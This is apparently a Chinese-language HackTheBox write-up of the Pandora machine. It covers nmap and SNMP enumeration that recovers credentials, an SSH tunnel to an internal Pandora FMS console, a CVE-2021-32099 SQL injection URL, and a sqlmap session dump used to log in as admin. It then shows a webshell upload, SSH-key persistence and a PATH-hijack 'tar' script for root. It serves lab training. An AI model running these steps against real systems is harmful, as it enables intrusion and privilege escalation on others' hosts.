nmap 結果
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 24:c2:95:a5:c3:0b:3f:f3:17:3c:68:d7:af:2b:53:38 (RSA)
|   256 b1:41:77:99:46:9a:6c:5d:d2:98:2f:c0:32:9a:ce:03 (ECDSA)
|_  256 e7:36:43:3b:a9:47:8a:19:01:58:b2:bc:89:f6:51:08 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Play | Landing
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.65 seconds
```

在網頁的角落有看到域名 先把他加進去
![image](https://hackmd.io/_uploads/rkmOeyFB1e.png)

網站裡面都沒東西 subdomain 也找不到 看了 writeup 知道有 udp port 要記得去掃
```
sudo nmap --min-rate 10000 -p- -sU 10.10.11.136
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-24 20:43 EST
Warning: 10.10.11.136 giving up on port because retransmission cap hit (10).
Nmap scan report for panda.htb (10.10.11.136)
Host is up (0.52s latency).
Not shown: 65504 open|filtered udp ports (no-response), 30 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp

Nmap done: 1 IP address (1 host up) scanned in 80.46 seconds
```

[這裡](https://hacktricks.boitatech.com.br/pentesting/pentesting-snmp)有關於 snmp 的教學 

用 snmpwalk 去爆破他 
```
snmp -v/2c -c public <IP>
```
但不知道為甚麼我的爆不出來 到一半就會斷掉= = 
 
上網看別人的 帳密是 `daniel` `HotelBabylon23` 正常會跑出這個登入紀錄
![image](https://hackmd.io/_uploads/HJMxNeFS1l.png)

進去後有一個叫 matt 的用戶 但我們沒有權限讀取裡頭的 flag
![image](https://hackmd.io/_uploads/SJ5umF5rke.png)

透過 linpeas.sh 查看可以發現他的 pandora.panda.htb 限制只有 localhost 的 80 port 可以存取 並由 matt 管理
```
<VirtualHost localhost:80>
  ServerAdmin admin@panda.htb
  ServerName pandora.panda.htb
  DocumentRoot /var/www/pandora
  AssignUserID matt matt
  <Directory /var/www/pandora>
    AllowOverride All
  </Directory>
  ErrorLog /var/log/apache2/error.log
  CustomLog /var/log/apache2/access.log combined
</VirtualHost>
```

因此可以透過 ssh -L 的參數把他的 80 port 映射過來
```
ssh -L :9001:localhost:80 daniel@10.10.11.136
```

這時去訪問 127.0.0.1:9001 就可以進到一個 CMS 網站
![image](https://hackmd.io/_uploads/HkbyZc9Bke.png)

是 `Pandora FMS v7.0NG.742_FIX_PERL2020` 網路上有找到四個相關漏洞 [這裡](https://www.sonarsource.com/blog/pandora-fms-742-critical-code-vulnerabilities-explained/)

其中有一個 SQLi 的 CVE 是可以利用的 [CVE-2021-32099](https://github.com/shyam0904a/Pandora_v7.0NG.742_exploit_unauthenticated?tab=readme-ov-file)

問題 url 在這裡 `http://127.0.0.1:9001/pandora_console/include/chart_generator.php?session_id=1%27` 
![image](https://hackmd.io/_uploads/BkgVd9cH1x.png)

用 sqlmap 去爆他 在 `tsessions_php` table 中的 is_session 找到 admin 的 session
```
+----------------------------+-----------------------------------------------------+-------------+
| id_session                 | data                                                | last_active |
+----------------------------+-----------------------------------------------------+-------------+
| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:"daniel";                            | 1638783555  |
| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                | 1638789018  |
| 18le11a0upgsjv7eld3fqnbqs8 | id_usuario|s:6:"daniel";                            | 1735203007  |
| 1um23if7s531kqf5da14kf5lvm | NULL                                                | 1638792211  |
| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                | 1638786129  |
| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:"daniel";                            | 1638540332  |
| 3me2jjab4atfa5f8106iklh4fc | NULL                                                | 1638795380  |
| 4f51mju7kcuonuqor3876n8o02 | NULL                                                | 1638786842  |
| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:"daniel";                            | 1638535373  |
| 59qae699l0971h13qmbpqahlls | NULL                                                | 1638787305  |
| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                | 1638792685  |
| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:"daniel";                            | 1638281946  |
| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:"daniel";                            | 1641195617  |
| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                | 1623957150  |
| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:"daniel";                            | 1638446321  |
| 8upeameujo9nhki3ps0fu32cgd | NULL                                                | 1638787267  |
| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:"daniel";                            | 1638881787  |
| a3a49kc938u7od6e6mlip1ej80 | NULL                                                | 1638795315  |
| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:"daniel";                            | 1638881664  |
| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                | 1638787213  |
| d0carbrks2lvmb90ergj7jv6po | NULL                                                | 1638786277  |
| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:"daniel";                            | 1641200284  |
| fikt9p6i78no7aofn74rr71m85 | NULL                                                | 1638786504  |
| fqd96rcv4ecuqs409n5qsleufi | NULL                                                | 1638786762  |
| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:"daniel";                            | 1638783230  |
| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:"matt";alert_msg|a:0:{}new_chat|b:0; | 1638796349  |
| gf40pukfdinc63nm5lkroidde6 | NULL                                                | 1638786349  |
| heasjj8c48ikjlvsf1uhonfesv | NULL                                                | 1638540345  |
| hhu4l2thfm779jfh1ol11d93g3 | id_usuario|s:5:"admin";                             | 1735202775  |
| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:"daniel";                            | 1638168492  |
| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:"daniel";                            | 1638456173  |
| kp90bu1mlclbaenaljem590ik3 | NULL                                                | 1638787808  |
| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                | 1638796348  |
| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:"daniel";                            | 1638540482  |
| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:"daniel";                            | 1637667827  |
| p5s1rcd21blgim74lbj7b3brug | id_usuario|s:6:"daniel";                            | 1735197254  |
| pjp312be5p56vke9dnbqmnqeot | id_usuario|s:6:"daniel";                            | 1638168416  |
| qq8gqbdkn8fks0dv1l9qk6j3q8 | NULL                                                | 1638787723  |
| r097jr6k9s7k166vkvaj17na1u | NULL                                                | 1638787677  |
| rgku3s5dj4mbr85tiefv53tdoa | id_usuario|s:6:"daniel";                            | 1638889082  |
| u5ktk2bt6ghb7s51lka5qou4r4 | id_usuario|s:6:"daniel";                            | 1638547193  |
| u74bvn6gop4rl21ds325q80j0e | id_usuario|s:6:"daniel";                            | 1638793297  |
| vdhsaetbra1iij98gie1tlb89g | NULL                                                | 1735203299  |
+----------------------------+-----------------------------------------------------+-------------+
```
貼到登入介面後就可以直接登入了
![image](https://hackmd.io/_uploads/HkDzlj9rJg.png)

在 `admin tool` 的 `File manager` 有個地方可以上傳檔案
![image](https://hackmd.io/_uploads/r1M085jSyl.png)

看他的路徑雖然有被加密 但 base64 就可以解開 
![image](https://hackmd.io/_uploads/Hybgw5jHyg.png)

成功拿到 webshell 並打 reverse shell 回來 得到 matt 權限並拿到 user flag
![image](https://hackmd.io/_uploads/S1uMw9irkg.png)

可以參考[這篇](https://0xdf.gitlab.io/2022/05/21/htb-pandora.html) 還有另一種是用 matt 身分拿到 shell 的

想使用 sudo -l 會跳錯誤
```
sudo -l
sudo: PERM_ROOT: setresuid(0, -1, -1): Operation not permitted
sudo: unable to initialize policy plugin
```

用 find / -perm -4000 -ls 2>/dev/null 有發現 `/usr/bin/pandora_backup` 但執行也會失敗

```
/usr/bin/pandora_backup
PandoraFMS Backup Utility
Now attempting to backup PandoraFMS client
tar: /root/.backup/pandora-backup.tar.gz: Cannot open: Permission denied
tar: Error is not recoverable: exiting now
Backup failed!
```

上網查後原因是說 reverse shell 不穩定因為他是半開放的 因此可以透過把 自己的 ssh public key 放進去 `/home/matt/.ssh/authorized_keys` 並去 ssh 連線

這時候 sudo -l 跟 `/usr/bin/pandora_backup` 都可以運作了
運行後會發現 /usr/bin/pandora_backup 是把 `/var/www/pandora/pandora_console/` 下的資料都備份一次

同時可以知道他是用 tar 在壓縮 且他沒有指定 tar 的路徑 所以可以偽造一個 tar 加入到環境變數 這樣當運行 pandora_backup 時就會先使用環境變數裡的
```
vi tar
#!/bin/bash

bash 


chmod +x tar
export PATH=/home/matt:$PATH
/usr/bin/pandora_backup
```

成功變成 root 拿到 flag
![image](https://hackmd.io/_uploads/H168Moorkx.png)
